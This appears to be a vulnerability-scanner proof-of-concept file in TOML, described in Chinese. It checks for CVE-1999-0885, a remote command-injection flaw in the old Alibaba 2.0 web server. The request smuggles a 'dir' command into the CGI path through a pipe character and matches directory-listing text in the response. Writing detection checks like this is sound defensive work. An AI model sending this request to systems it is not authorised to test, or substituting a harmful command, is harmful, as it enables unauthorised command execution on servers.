[info]
author = "ave"
description = "Alibaba 2.0 Web 服务器多个 CGI 程序（如 get32.exe、tst.bat）存在命令注入漏洞，攻击者在畸形 URL 中插入管道符（|）即可让服务器将后续内容作为系统命令执行。本 PoC 通过向 /cgi-bin/get32.exe 发送含管道符命令的 HTTP 请求，检测目标是否存在该任意命令执行漏洞。"
id = "POC-AVE-1999-0677"
name = "CVE-1999-0885 Alibaba Web Server 远程命令执行 PoC"
severity = "high"
tags = ["ave-1999-0677"]
vuln_id = [
    "CVE-1999-0885",
    "AVE-1999-0677",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/get32.exe|dir"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Volume",
    "Directory of",
]
